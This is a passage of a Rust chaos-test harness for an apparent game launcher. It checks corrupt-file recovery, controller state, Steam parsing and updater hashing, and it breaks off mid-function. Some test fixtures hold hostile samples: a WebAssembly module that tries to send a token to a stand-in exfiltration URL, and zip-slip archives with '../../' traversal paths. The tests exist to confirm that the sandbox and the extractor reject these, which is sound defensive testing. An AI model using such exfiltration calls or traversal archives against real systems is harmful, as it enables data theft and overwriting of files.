use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Instant, SystemTime, UNIX_EPOCH};

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ChaosCaseResult {
    pub name: String,
    pub passed: bool,
    pub elapsed_ms: u64,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct StressHarnessReport {
    pub version: String,
    pub total_cases: usize,
    pub passed_cases: usize,
    pub failed_cases: usize,
    pub elapsed_ms: u64,
    pub cases: Vec<ChaosCaseResult>,
}

fn unique_stress_dir(tag: &str) -> Result<PathBuf, String> {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let dir = std::env::temp_dir().join(format!(
        "duke_chaos_{}_{}_{}",
        tag,
        std::process::id(),
        nonce
    ));
    fs::create_dir_all(&dir)
        .map_err(|e| format!("Failed creating chaos temp dir {}: {e}", dir.display()))?;
    Ok(dir)
}

fn run_case<F>(name: &str, f: F) -> ChaosCaseResult
where
    F: FnOnce() -> Result<String, String>,
{
    let started = Instant::now();
    match f() {
        Ok(detail) => ChaosCaseResult {
            name: name.to_string(),
            passed: true,
            elapsed_ms: started.elapsed().as_millis() as u64,
            detail,
        },
        Err(detail) => ChaosCaseResult {
            name: name.to_string(),
            passed: false,
            elapsed_ms: started.elapsed().as_millis() as u64,
            detail,
        },
    }
}

fn case_corrupt_zip_recovery(root: &Path) -> Result<String, String> {
    let corrupt_zip = root.join("corrupt_payload.zip");
    let dst = root.join("zip_out");
    let mut garbage = b"PK\x03\x04\x14\x00\x00\x00\x08\x00".to_vec();
    garbage.extend_from_slice(&[0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0xFF, 0x7A, 0x3C]);
    fs::write(&corrupt_zip, &garbage).map_err(|e| e.to_string())?;

    if crate::extract_archive_to_folder_sync(&corrupt_zip, &dst).is_ok() {
        return Err("Corrupt ZIP unexpectedly reported Ok".to_string());
    }

    let traversal_path = Path::new("..\\..\\outside_evil.zip");
    if crate::extract_archive_to_folder_sync(traversal_path, &dst).is_ok() {
        return Err("Path traversal archive check unexpectedly passed".to_string());
    }

    Ok("Corrupt ZIP & traversal path rejected cleanly with zero panic.".to_string())
}

fn case_multidisc_cue_bin_grouping(root: &Path) -> Result<String, String> {
    let disc_dir = root.join("roms_ps1");
    fs::create_dir_all(&disc_dir).map_err(|e| e.to_string())?;

    for disc in 1..=2 {
        let cue = disc_dir.join(format!("Chrono Chaos (Disc {}).cue", disc));
        let bin = disc_dir.join(format!("Chrono Chaos (Disc {}).bin", disc));
        fs::write(
            &cue,
            format!("FILE \"Chrono Chaos (Disc {}).bin\" BINARY\n  TRACK 01 MODE2/2352\n", disc),
        )
        .map_err(|e| e.to_string())?;
        fs::write(&bin, vec![disc as u8; 1024]).map_err(|e| e.to_string())?;
    }

    let groups = crate::rom_patcher::generate_m3u_playlists_in_dir(&disc_dir)?;
    if groups.len() != 1 {
        return Err(format!("Expected 1 M3U group, got {}", groups.len()));
    }
    let m3u_text = fs::read_to_string(&groups[0].m3u_path).map_err(|e| e.to_string())?;
    if !m3u_text.contains("(Disc 1).cue") || !m3u_text.contains("(Disc 2).cue") {
        return Err(format!("Generated M3U missing discs: {}", m3u_text));
    }

    Ok(format!(
        "Grouped 2-disc .cue/.bin set into {} cleanly.",
        groups[0].m3u_path
    ))
}

fn case_bios_hash_mismatch_and_missing(root: &Path) -> Result<String, String> {
    let emu_root = root.join("emulators");
    let cas_root = root.join("cas_bios");
    let q_root = root.join("quarantine_bios");
    let src_dir = root.join("bios_drops");
    fs::create_dir_all(&src_dir).map_err(|e| e.to_string())?;

    // Valid name scph5501.bin with invalid hash bytes must be quarantined rather than installed!
    let bad_bios = src_dir.join("scph5501.bin");
    fs::write(&bad_bios, vec![0xA5u8; 4096]).map_err(|e| e.to_string())?;

    let report = crate::bios_vault::scan_and_install_bios_in_roots(
        &[src_dir],
        &emu_root,
        &cas_root,
        &q_root,
        None,
    )?;
    if report.quarantined_count == 0 {
        return Err("Wrong-hash scph5501.bin was not quarantined.".to_string());
    }
    if report.missing_required_count == 0 {
        return Err("Missing required BIOS report unexpectedly showed 0 missing.".to_string());
    }
    Ok(format!(
        "Quarantined {} mismatched BIOS file(s); missingRequired={}.",
        report.quarantined_count, report.missing_required_count
    ))
}

fn case_disabled_projfs_and_platform_fallback() -> Result<String, String> {
    let projfs = crate::projfs_stream::probe_projfs_status();
    if projfs.message.trim().is_empty() {
        return Err("ProjFS runtime status returned empty message.".to_string());
    }
    let ds = crate::direct_storage::probe_direct_storage_runtime(None);
    if ds.active_backend.trim().is_empty() {
        return Err("DirectStorage probe returned empty backend label.".to_string());
    }
    let snap = duke_core::platform_backend::current_platform_snapshot();
    if snap.arch.trim().is_empty() || snap.isolation.backend_name.trim().is_empty() {
        return Err("PlatformBackend returned incomplete probe metadata.".to_string());
    }
    Ok(format!(
        "ProjFS='{}', DS='{}', Platform='{}/{}'.",
        if projfs.api_bound { "Bound" } else { "SafeFallback" },
        ds.active_backend,
        snap.os_label,
        snap.arch
    ))
}

fn case_malformed_json_and_catalog_recovery(root: &Path) -> Result<String, String> {
    let lib_path = root.join("library.json");
    let bak_path = root.join("library.json.bak");
    fs::write(&bak_path, "[{\"id\":\"ok_game\",\"title\":\"Safe Backup\"}]")
        .map_err(|e| e.to_string())?;
    fs::write(&lib_path, "{corrupt_truncated: [").map_err(|e| e.to_string())?;

    let recovered = crate::self_heal::recover_protected_json_if_corrupt(&lib_path)?;
    if !recovered {
        return Err("recover_protected_json_if_corrupt returned false on corrupt primary JSON.".to_string());
    }
    let restored_raw = crate::self_heal::read_json_with_bak_recovery(&lib_path)?;
    if !restored_raw.contains("Safe Backup") {
        return Err("Recovered JSON missing expected .bak payload.".to_string());
    }

    let (settings, _changed) = crate::normalize_loaded_settings("{broken_settings_json!!!");
    if settings.theme.trim().is_empty() || settings.card_zoom_px < 125 {
        return Err("Malformed settings.json failed to fall back cleanly.".to_string());
    }
    let (migrated_settings, migrated) =
        crate::normalize_loaded_settings(r#"{"theme":"invalid_chaos_theme","cardZoomPx":999}"#);
    if !migrated || migrated_settings.theme != "dark" || migrated_settings.card_zoom_px != 280 {
        return Err("Invalid settings fields failed to migrate and clamp cleanly.".to_string());
    }

    if crate::sources::parse_hydra_manifest_str("{not valid json", "chaos").is_ok() {
        return Err("Malformed Hydra source JSON unexpectedly parsed Ok.".to_string());
    }

    fs::write(root.join("catalog.dkcat"), b"BADCAT00").map_err(|e| e.to_string())?;
    if crate::self_heal::verify_catalog_integrity(root) {
        return Err("Corrupt catalog.dkcat unexpectedly verified true.".to_string());
    }

    Ok("Corrupt library.json restored via .bak; malformed settings/Hydra/catalog recovered cleanly.".to_string())
}

fn case_0xc000007b_crash_diagnosis_and_pe(root: &Path) -> Result<String, String> {
    let diag = crate::fix_finder::diagnose_crash_code(
        "chaos_07b",
        "Chaos Engine Game",
        "missing_game.exe",
        None,
        0xC000_007Bu32 as i32,
        412,
    )
    .ok_or_else(|| "0xC000007B failed to generate CrashDiagnosisReport.".to_string())?;
    if !diag.exit_code_hex.contains("0xC000007B") {
        return Err(format!("Unexpected hex code '{}'", diag.exit_code_hex));
    }
    let recommends_dlls = diag
        .recommended_actions
        .iter()
        .any(|a| a.id == "heal_runtime_dlls" && a.recommended);
    if !recommends_dlls {
        return Err("0xC000007B did not recommend heal_runtime_dlls.".to_string());
    }

    let bad_exe = root.join("broken_header.exe");
    fs::write(&bad_exe, b"MZ\x90\x00\x03\x00BADPE").map_err(|e| e.to_string())?;
    let bytes = fs::read(&bad_exe).map_err(|e| e.to_string())?;
    if crate::pe_inspect::parse_pe_header_and_imports(&bytes).is_ok() {
        return Err("Truncated PE header unexpectedly parsed Ok.".to_string());
    }
    Ok("0xC000007B diagnosed with DLL/DXVK remediation; truncated PE safely rejected.".to_string())
}

fn case_bler_texture_conditioning_and_corruption(root: &Path) -> Result<String, String> {
    let blocks = 1024usize;
    let mut dds = vec![0u8; 128 + blocks * 8];
    dds[0..4].copy_from_slice(b"DDS ");
    dds[4..8].copy_from_slice(&124u32.to_le_bytes());
    dds[12..16].copy_from_slice(&128u32.to_le_bytes());
    dds[16..20].copy_from_slice(&128u32.to_le_bytes());
    dds[76..80].copy_from_slice(&32u32.to_le_bytes());
    dds[84..88].copy_from_slice(b"DXT1");
    for i in 0..blocks {
        let base = 128 + i * 8;
        let c = (i as u16).wrapping_mul(5);
        dds[base..base + 2].copy_from_slice(&c.to_le_bytes());
        dds[base + 2..base + 4].copy_from_slice(&c.wrapping_add(0x0420).to_le_bytes());
        dds[base + 4..base + 8].copy_from_slice(&((i as u32).wrapping_mul(0x5555_1234)).to_le_bytes());
    }
    let dds_path = root.join("chaos_tex.dds");
    let dkds_path = root.join("chaos_tex.dds.dkds");
    fs::write(&dds_path, &dds).map_err(|e| e.to_string())?;
    let stats = crate::direct_storage::encode_dkds_stream_with_bler(&dds_path, &dkds_path, 3)?;
    if stats.bler_conditioned_chunks == 0 {
        return Err("BLER conditioning was not applied to BC1 DDS payload.".to_string());
    }
    crate::direct_storage::verify_dkds_stream(&dkds_path, Some(&stats.source_blake3))?;

    let mut raw = fs::read(&dkds_path).map_err(|e| e.to_string())?;
    if let Some(last) = raw.last_mut() {
        *last ^= 0xFF;
    }
    fs::write(&dkds_path, &raw).map_err(|e| e.to_string())?;
    if crate::direct_storage::verify_dkds_stream(&dkds_path, Some(&stats.source_blake3)).is_ok() {
        return Err("Corrupted BLER DKDS stream bypassed verification.".to_string());
    }
    Ok(format!(
        "BLER BC1 stream encoded ({} conditioned chunk(s), {} B extra saved) & tamper caught.",
        stats.bler_conditioned_chunks, stats.bler_extra_saved_bytes
    ))
}

fn case_wasm_sandbox_and_fse_safety() -> Result<String, String> {
    let malicious_wat = br#"(module
  (import "duke" "http_get_scoped" (func $http (param i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 1)
  (data (i32.const 0) "https://exfil.unapproved.invalid/token")
  (func (export "duke_run_hook") (result i32)
    (call $http (i32.const 0) (i32.const 38) (i32.const 256) (i32.const 256))
  )
)"#;
    let res = crate::wasm_plugins::execute_wasm_module_bytes(
        "chaos_wasm",
        malicious_wat,
        crate::wasm_plugins::PluginCapabilityGrant::default(),
        "metadata_lookup",
        "",
        &[],
        Some(Arc::new(|_| Ok("should_never_fetch".to_string()))),
    )?;
    if res.exit_code != -1 || res.capability_denials.is_empty() {
        return Err("Wasmtime sandbox failed to block unapproved HTTP exfil attempt.".to_string());
    }
    if crate::fse_shell::is_safe_to_suspend_bloat_exe("explorer.exe")
        || crate::fse_shell::is_safe_to_suspend_bloat_exe("csrss.exe")
    {
        return Err("FSE bloat safety guard allowed suspending protected Windows process.".to_string());
    }
    if crate::duke_link::DukeLinkPacket::decode(b"corrupt_pkt").is_ok() {
        return Err("DukeLinkPacket decoded invalid garbage payload.".to_string());
    }
    Ok("Wasmtime denied unauthorized domain, FSE protected core Windows processes, QUIC decoder rejected garbage.".to_string())
}

fn extract_quoted_args(haystack: &str, fn_prefix: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = haystack;
    while let Some(pos) = rest.find(fn_prefix) {
        let after = &rest[pos + fn_prefix.len()..];
        let trimmed = after.trim_start();
        if let Some(quote) = trimmed.chars().next() {
            if quote == '"' || quote == '\'' {
                let inner = &trimmed[1..];
                if let Some(end_q) = inner.find(quote) {
                    out.push(inner[..end_q].to_string());
                    rest = &inner[end_q + 1..];
                    continue;
                }
            }
        }
        rest = after;
    }
    out
}

fn resolve_workspace_launcher_dirs() -> Option<(PathBuf, PathBuf)> {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    if manifest_dir.join("src").join("main.rs").is_file() {
        if let Some(parent) = manifest_dir.parent() {
            if parent.join("src").join("index.html").is_file() {
                return Some((parent.to_path_buf(), manifest_dir));
            }
        }
    }
    if let Ok(cwd) = std::env::current_dir() {
        let dl = if cwd.join("duke-launcher").join("src").join("index.html").is_file() {
            cwd.join("duke-launcher")
        } else if cwd.join("src").join("index.html").is_file() {
            cwd
        } else {
            return None;
        };
        let tauri = dl.join("src-tauri");
        if tauri.join("src").join("main.rs").is_file() {
            return Some((dl, tauri));
        }
    }
    None
}

fn case_controller_disconnect_and_mode_exit_state_hygiene() -> Result<String, String> {
    let mut dirty = crate::couch_mode::UniversalPadState {
        connected: true,
        slot: 2,
        lx: 0.78,
        ly: -0.64,
        rx: -0.45,
        ry: 0.35,
        lt: 0.92,
        rt: 0.88,
        a: true,
        b: true,
        x: true,
        y: true,
        lb: true,
        rb: true,
        back: true,
        start: true,
        ls: true,
        rs: true,
        up: true,
        down: true,
        left: true,
        right: true,
        guide: true,
        buttons_mask: 0xFFFF,
        controller_kind: "xbox".to_string(),
        device_name: "Mock Pad".to_string(),
        vid_pid: "045e:02ea".to_string(),
        raw_axes: [0.5, -0.5, 0.25, -0.25],
        calibrated_axes: [0.4, -0.4, 0.2, -0.2],
        ..Default::default()
    };
    dirty.zero_inputs();

    if dirty.connected
        || dirty.slot != 0
        || dirty.lx != 0.0
        || dirty.ly != 0.0
        || dirty.rx != 0.0
        || dirty.ry != 0.0
        || dirty.lt != 0.0
        || dirty.rt != 0.0
        || dirty.buttons_mask != 0
        || dirty.a
        || dirty.b
        || dirty.x
        || dirty.y
        || dirty.lb
        || dirty.rb
        || dirty.back
        || dirty.start
        || dirty.ls
        || dirty.rs
        || dirty.up
        || dirty.down
        || dirty.left
        || dirty.right
        || dirty.guide
        || dirty.controller_kind != "none"
        || dirty.device_name != "None"
        || !dirty.vid_pid.is_empty()
    {
        return Err("UniversalPadState::zero_inputs left non-zero controller state.".to_string());
    }

    let snap = crate::couch_mode::UniversalPadState::disconnected_snapshot(0.14, true);
    if snap.connected
        || snap.buttons_mask != 0
        || snap.lx != 0.0
        || snap.ly != 0.0
        || snap.controller_kind != "none"
    {
        return Err("UniversalPadState::disconnected_snapshot did not return zeroed state.".to_string());
    }

    for _ in 0..25 {
        crate::couch_mode::clear_transient_couch_state();
        let status = crate::couch_mode::current_couch_status(false);
        if status.radial_visible
            || status.virtual_keyboard_visible
            || status.radial_selected_slot.is_some()
        {
            return Err("Transient Duke Deck state leaked after clear_transient_couch_state().".to_string());
        }
    }

    Ok("Controller disconnect zero-inputs, disconnected snapshot, and 25x Duke Deck transient state resets verified.".to_string())
}

fn make_chaos_game(id: &str, title: &str, dir: &Path, exe: &Path) -> crate::GameEntry {
    crate::GameEntry {
        id: id.to_string(),
        title: title.to_string(),
        exe_path: exe.to_string_lossy().to_string(),
        install_dir: dir.to_string_lossy().to_string(),
        source: "Portable".to_string(),
        is_installed: true,
        added_at: 1_700_000_000,
        ..Default::default()
    }
}

fn case_self_heal_v2_unclean_recovery(root: &Path) -> Result<String, String> {
    let data_dir = root.join("self_heal_v2_data");
    fs::create_dir_all(&data_dir).map_err(|e| e.to_string())?;

    // 1. Seed valid .bak + corrupt protected JSON + orphan .tmp + stale session.lock
    let settings_path = data_dir.join("settings.json");
    let settings_bak = crate::self_heal::backup_path_for(&settings_path);
    fs::write(&settings_bak, br#"{"autoCleanCompleted":true,"couchMode":false}"#)
        .map_err(|e| e.to_string())?;
    fs::write(&settings_path, b"{broken-json-truncated").map_err(|e| e.to_string())?;
    fs::write(data_dir.join("partial_state.tmp"), b"stale").map_err(|e| e.to_string())?;
    fs::write(
        data_dir.join("session.lock"),
        br#"{"pid":999999,"sessionId":42,"startedAt":1700000000,"crashStreak":0,"activeCommand":"stress_cmd"}"#,
    )
    .map_err(|e| e.to_string())?;

    let wv_lock_dir = data_dir.join("EBWebView");
    fs::create_dir_all(&wv_lock_dir).map_err(|e| e.to_string())?;
    fs::write(wv_lock_dir.join("SingletonLock"), b"stale").map_err(|e| e.to_string())?;

    let report = crate::self_heal::run_startup_self_heal_in_dir(&data_dir);
    crate::self_heal::clear_session_lock_in_dir(&data_dir);

    if !report.unclean_previous_exit {
        return Err("Self-Heal v2 did not flag unclean previous exit from stale session.lock.".to_string());
    }
    if report.cleaned_tmp_files == 0 {
        return Err("Self-Heal v2 did not clean orphan .tmp file.".to_string());
    }
    if !report.restored_json_files.iter().any(|f| f == "settings.json") {
        return Err(format!(
            "Self-Heal v2 did not restore corrupt settings.json from .bak: {:?}",
            report.restored_json_files
        ));
    }
    if report.webview_locks_cleared == 0 {
        return Err("Self-Heal v2 did not clear stale WebView2 lockfile.".to_string());
    }

    let repaired = fs::read_to_string(&settings_path).map_err(|e| e.to_string())?;
    if !repaired.contains("autoCleanCompleted") {
        return Err("Restored settings.json content missing expected field.".to_string());
    }

    Ok(format!(
        "Unclean exit detected, {} .tmp cleaned, {} JSON restored, {} WebView lock(s) freed.",
        report.cleaned_tmp_files,
        report.restored_json_files.len(),
        report.webview_locks_cleared
    ))
}

fn case_archive_native_zip_slip_rejection(root: &Path) -> Result<String, String> {
    if crate::archive_native::sanitize_archive_relative_path("../../evil_escape.txt").is_ok() {
        return Err("sanitize_archive_relative_path accepted parent directory traversal.".to_string());
    }

    let work_dir = root.join("zip_slip_test");
    let extract_dir = work_dir.join("out");
    fs::create_dir_all(&work_dir).map_err(|e| e.to_string())?;
    fs::create_dir_all(&extract_dir).map_err(|e| e.to_string())?;

    let zip_path = work_dir.join("malicious.zip");
    {
        let f = fs::File::create(&zip_path).map_err(|e| e.to_string())?;
        let mut zw = zip::ZipWriter::new(f);
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored);
        zw.start_file("../../evil_escape.txt", opts)
            .map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut zw, b"pwned").map_err(|e| e.to_string())?;
        zw.finish().map_err(|e| e.to_string())?;
    }

    if crate::archive_native::extract_archive_pure_rust(&zip_path, &extract_dir).is_ok() {
        return Err("extract_archive_pure_rust unexpectedly allowed Zip-Slip traversal.".to_string());
    }
    if work_dir.join("evil_escape.txt").exists() || root.join("evil_escape.txt").exists() {
        return Err("Zip-Slip payload escaped onto disk!".to_string());
    }

    Ok("Native ZIP extractor rejected `../../evil_escape.txt` with zero files written outside dest.".to_string())
}

fn case_lib_store_wal_recovery(root: &Path) -> Result<String, String> {
    let data_dir = root.join("dklib_wal_test");
    fs::create_dir_all(&data_dir).map_err(|e| e.to_string())?;
    let g_dir = root.join("wal_dummy_game");
    fs::create_dir_all(&g_dir).map_err(|e| e.to_string())?;
    let exe = g_dir.join("game.exe");
    fs::write(&exe, b"MZ\x90\x00").map_err(|e| e.to_string())?;

    let g1 = make_chaos_game("wal_1", "WAL Alpha", &g_dir, &exe);
    crate::lib_store::save_library_dklib_full(&data_dir, &[g1])?;

    let g2 = make_chaos_game("wal_2", "WAL Beta", &g_dir, &exe);
    crate::lib_store::append_upsert_wal(&data_dir, &g2)?;
    crate::lib_store::append_playtime_wal(&data_dir, "wal_1", 1200, 1_700_000_500)?;
    crate::lib_store::append_favorite_wal(&data_dir, "wal_2", true)?;
    crate::lib_store::append_cover_wal(&data_dir, "wal_2", "custom_cover.png", None, None)?;

    let loaded = crate::lib_store::load_library_dklib(&data_dir)?;
    if loaded.len() != 2 {
        return Err(format!("Expected 2 games after WAL replay, got {}", loaded.len()));
    }
    let l1 = loaded
        .iter()
        .find(|g| g.id == "wal_1")
        .ok_or_else(|| "Missing wal_1 after WAL replay.".to_string())?;
    let l2 = loaded
        .iter()
        .find(|g| g.id == "wal_2")
        .ok_or_else(|| "Missing wal_2 after WAL replay.".to_string())?;
    if l1.total_playtime_secs() < 1200 || !l2.is_favorite || l2.cover_url != "custom_cover.png" {
        return Err("WAL delta mutations did not replay accurately.".to_string());
    }

    let _ = crate::lib_store::compact_dklib_if_needed(&data_dir, true)?;
    let heal = crate::lib_store::verify_and_repair_dklib(&data_dir)?;
    let post_compact = crate::lib_store::load_library_dklib(&data_dir)?;
    if post_compact.len() != 2 || heal.recovered_from_backup_or_json {
        return Err(format!("DKLIB compaction/verification failed integrity check: {}", heal.detail));
    }

    Ok("DKLIB binary + CRC WAL upsert/playtime/favorite/cover replay + compaction verified.".to_string())
}

fn case_rom_shrink_and_verify_roundtrip(root: &Path) -> Result<String, String> {
    let rom_dir = root.join("rom_shrink_test");
    fs::create_dir_all(&rom_dir).map_err(|e| e.to_string())?;
    let bin_path = rom_dir.join("SynthDisc.bin");
    let cue_path = rom_dir.join("SynthDisc.cue");

    // 16 Mode1/2352 CD sectors (37,632 bytes) with compressible sector payload
    let sectors = vec![0x5Au8; 16 * 2352];
    fs::write(&bin_path, &sectors).map_err(|e| e.to_string())?;
    fs::write(
        &cue_path,
        "FILE \"SynthDisc.bin\" BINARY\n  TRACK 01 MODE1/2352\n    INDEX 01 00:00:00\n",
    )
    .map_err(|e| e.to_string())?;

    let rep = crate::rom_shrink::compress_rom_path(&cue_path, false)?;
    let chd_path = PathBuf::from(&rep.output_path);
    if !chd_path.is_file() || rep.compressed_bytes == 0 || rep.compressed_bytes >= rep.original_bytes {
        return Err(format!(
            "Unexpected CHD shrink result: {} -> {} bytes",
            rep.original_bytes, rep.compressed_bytes
        ));
    }

    let (sha1_hex, crc32_hex, size_bytes) =
        crate::rom_shrink::verify_chd_or_rvz_integrity(&chd_path)?;
    if sha1_hex.len() != 40 || crc32_hex.is_empty() || size_bytes != sectors.len() as u64 {
        return Err(format!(
            "CHD integrity check mismatch: sha1={sha1_hex}, crc32={crc32_hex}, size={size_bytes}"
        ));
    }

    Ok(format!(
        "Compressed {} B -> {} B CHD v5 and verified (SHA-1 {sha1_hex}, CRC32 {crc32_hex}).",
        rep.original_bytes, rep.compressed_bytes
    ))
}

fn case_discord_ipc_desktop_chord_and_save_watcher(root: &Path) -> Result<String, String> {
    // 1. Discord binary frame encode/decode roundtrip
    let payload = crate::discord_ipc::build_set_activity_payload(
        std::process::id(),
        "Chaos Verification Quest",
        "Steam",
        Some("Hosting 2P"),
        1_700_000_000,
        "chaos-nonce",
    );
    let wire = crate::discord_ipc::encode_discord_ipc_frame(1, &payload)?;
    let (op, decoded) = crate::discord_ipc::decode_discord_ipc_frame(&wire)?;
    if op != 1 || decoded["nonce"] != "chaos-nonce" {
        return Err("Discord IPC frame decode mismatch.".to_string());
    }

    // 2. Desktop chord layer Guide+axis mouse emission and deck exit release
    let mut tracker = crate::desktop_chord::ChordTracker::default();
    let pad = crate::couch_mode::UniversalPadState {
        connected: true,
        guide: true,
        lx: 0.75,
        ly: -0.25,
        a: true,
        ..Default::default()
    };
    let held_actions = crate::desktop_chord::compute_chord_actions(&mut tracker, &pad, true, 100);
    if !tracker.chord_active || held_actions.is_empty() {
        return Err("Desktop chord failed to emit actions with Guide held.".to_string());
    }
    let _released = crate::desktop_chord::compute_chord_actions(&mut tracker, &pad, false, 120);
    if tracker.chord_active || tracker.left_down {
        return Err("Desktop chord held input leaked after deck exit.".to_string());
    }

    // 3. Save watcher BLAKE3 snapshot + immediate dedup skip
    let save_dir = root.join("save_watcher_saves");
    let cas_dir = root.join("save_watcher_cas");
    fs::create_dir_all(&save_dir).map_err(|e| e.to_string())?;
    fs::create_dir_all(&cas_dir).map_err(|e| e.to_string())?;
    fs::write(save_dir.join("slot1.sav"), b"duke-save-payload-v1").map_err(|e| e.to_string())?;

    let first = crate::save_watcher::capture_dedup_save_snapshot(
        "chaos_save_game",
        std::slice::from_ref(&save_dir),
        &cas_dir,
        Some("auto-save-watcher"),
    )?;
    if first.is_none() {
        return Err("Expected initial save watcher snapshot to capture cleanly.".to_string());
    }
    let second = crate::save_watcher::capture_dedup_save_snapshot(
        "chaos_save_game",
        std::slice::from_ref(&save_dir),
        &cas_dir,
        Some("auto-save-watcher"),
    )?;
    if second.is_some() {
        return Err("Save watcher did not deduplicate identical unchanged save tree.".to_string());
    }

    Ok("Discord IPC frame roundtrip, desktop chord cursor/release, and BLAKE3 save-watcher dedup verified.".to_string())
}

fn case_redist_cleaner_cas_reclaim(root: &Path) -> Result<String, String> {
    let external_root = if crate::uninstaller::is_protected_user_or_system_path(root) {
        let p = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join(format!("duke_stress_redist_{}", std::process::id()));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).map_err(|e| e.to_string())?;
        Some(p)
    } else {
        None
    };
    let effective_root = external_root.as_deref().unwrap_or(root);
    let game_dir = effective_root.join("redist_game");
    let redist_dir = game_dir.join("_CommonRedist").join("vcredist");
    fs::create_dir_all(&redist_dir).map_err(|e| e.to_string())?;
    let exe_path = game_dir.join("GameMain.exe");
    fs::write(&exe_path, vec![0x4Du8; 1024]).map_err(|e| e.to_string())?;
    fs::write(redist_dir.join("vc_redist.x64.exe"), vec![0x77u8; 4096])
        .map_err(|e| e.to_string())?;
    fs::write(game_dir.join("CrashDump.dmp"), vec![0xEEu8; 2048])
        .map_err(|e| e.to_string())?;

    let mut lib = vec![make_chaos_game("redist_1", "Bloat Game", &game_dir, &exe_path)];
    let res = (|| -> Result<String, String> {
        let scan = crate::redist_cleaner::scan_redist_bloat_for_library(&lib, Some("redist_1"));
        if scan.games_with_bloat != 1 || scan.total_reclaimable_bytes < 6144 {
            return Err(format!(
                "Redist scan missed expected bloat: games={}, bytes={}",
                scan.games_with_bloat, scan.total_reclaimable_bytes
            ));
        }

        let clean = crate::redist_cleaner::clean_redist_bloat_with_cas(&mut lib, Some("redist_1"))?;
        if !clean.errors.is_empty() {
            return Err(format!("Redist clean errors: {:?}", clean.errors));
        }
        if clean.bytes_reclaimed < 6144 || clean.snapshot_ids.is_empty() || !exe_path.is_file() || redist_dir.exists() {
            return Err("Redist clean did not safely reclaim bloat while preserving executable + .duke-cas snapshot.".to_string());
        }

        Ok(format!(
            "Scanned & safely reclaimed {} ({} snapshot(s)) while keeping executable intact.",
            clean.bytes_reclaimed_formatted,
            clean.snapshot_ids.len()
        ))
    })();
    if let Some(ext) = external_root {
        let _ = fs::remove_dir_all(&ext);
    }
    res
}

fn case_minimize_settings_and_updater_sanity(root: &Path) -> Result<String, String> {
    let defaults = crate::LauncherSettings::default();
    if defaults.minimize_to_tray || defaults.close_to_tray || !defaults.auto_check_updates {
        return Err(format!(
            "Unexpected default tray/updater flags: minimize_to_tray={}, close_to_tray={}, auto_check_updates={}",
            defaults.minimize_to_tray, defaults.close_to_tray, defaults.auto_check_updates
        ));
    }

    let sample_path = root.join("updater_sample.bin");
    fs::write(&sample_path, b"duke-v2.3.2-binary-payload").map_err(|e| e.to_string())?;
    let mismatch = crate::updater::verify_file_sha256_streaming(
        &sample_path,
        "0000000000000000000000000000000000000000000000000000000000000000",
    );
    if mismatch.is_ok() {
        return Err("Updater SHA-256 verification accepted a mismatched digest.".to_string());
    }
    if !crate::updater::is_newer_version("2.3.1", "v2.3.2")
        || crate::updater::is_newer_version("2.3.2", "v2.3.2")
    {
        return Err("Updater SemVer comparison failed v2.3.2 check.".to_string());
    }

    Ok("Opt-in tray defaults (false/false), auto-check updates (true), SemVer, and SHA-256 rejection verified.".to_string())
}

fn case_steam_mini_profile_and_app_system(root: &Path) -> Result<String, String> {
    let xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<profile>
    <steamID64>76561198012345678</steamID64>
    <steamID><![CDATA[DukeCommander &quot;King&quot; &#39;3D&#39; &amp; Co.]]></steamID>
    <onlineState>in-game</onlineState>
    <stateMessage><![CDATA[In-Game<br/>Cyberpunk 2077]]></stateMessage>
    <privacyState>public</privacyState>
    <avatarFull><![CDATA[https://avatars.steamstatic.com/abc_full.jpg]]></avatarFull>
    <memberSince>November 15, 2014</memberSince>
    <summary><![CDATA[<b>Zero Bloat</b><br>Speed &amp; Stability]]></summary>
    <mostPlayedGames>
        <mostPlayedGame>
            <gameName><![CDATA[Cyberpunk 2077]]></gameName>
            <gameLink><![CDATA[https://steamcommunity.com/app/1091500]]></gameLink>
            <gameLogo><![CDATA[https://cdn.cloudflare.steamstatic.com/steam/apps/1091500/header.jpg]]></gameLogo>
            <hoursPlayed>14.2</hoursPlayed>
            <hoursOnRecord>218.5</hoursOnRecord>
        </mostPlayedGame>
    </mostPlayedGames>
</profile>"#;
    let target = crate::steam_profile::SteamProfileTarget::SteamId64("76561198012345678".to_string());
    let prof = crate::steam_profile::parse_steam_community_xml(xml, &target)?;
    if prof.persona_name != "DukeCommander \"King\" '3D' & Co."
        || prof.summary_text != "Zero Bloat\nSpeed & Stability"
        || prof.privacy_state != "public"
        || prof.showcase_games.len() != 1
        || prof.showcase_games[0].app_id != Some(1091500)
    {
        return Err("Steam XML profile parsing or CDATA/entity decoding failed validation.".to_string());
    }

    let v2_json = serde_json::json!({
        "response": {
            "players": [{
                "steamid": "76561198012345678",
                "personaname": "PrivateCommander",
                "communityvisibilitystate": 1,
                "personastate": 0
            }]
        }
    });
    let v2_prof = crate::steam_profile::parse_player_summaries_v2_json(&v2_json, &target)?;
    if v2_prof.status_label != "Steam Profile Private" || v2_prof.privacy_state != "private" {
        return Err("GetPlayerSummaries/v2 fallback did not classify private profile status.".to_string());
    }
    if crate::friends::classify_steam_friends_error("HTTP 401", true) != "Steam Profile Private"
        || crate::friends::classify_steam_friends_error("HTTP 401", false) != "Invalid API Key"
        || crate::friends::classify_steam_friends_error("No Local SteamID64", false) != "No Local SteamID64"
        || crate::friends::classify_steam_friends_error("timeout", false) != "Network Unreachable"
    {
        return Err("Steam friends diagnostic classifier returned unexpected status badge.".to_string());
    }

    crate::steam_profile::clear_steam_profile_cache();
    crate::friends::clear_friends_cache();

    // Verify shutdown WAL flush helper works on an isolated temp dir without panicking
    let wal_dir = root.join("shutdown_wal_flush");
